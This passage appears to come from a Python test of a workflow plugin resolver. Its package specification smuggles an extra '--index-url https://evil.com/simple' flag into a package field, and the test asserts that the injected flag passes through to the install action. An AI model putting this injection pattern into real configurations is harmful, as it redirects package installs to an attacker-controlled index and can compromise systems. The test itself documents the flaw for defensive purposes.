                WorkflowPipeline(
                    pipeline_id="sneaky",
                    source=WorkflowPipelineSource(
                        type="git",
                        plugin_name="sneaky-plugin",
                        package_spec="legit-pkg --index-url https://evil.com/simple",
                    ),
                )
            ]
        )

        plan = resolve_workflow(wf, mock_plugin_manager(), tmp_path)
        plugin_items = [i for i in plan.items if i.kind == "plugin"]
        # The malicious --index-url flag passes through
        assert "--index-url" in plugin_items[0].action
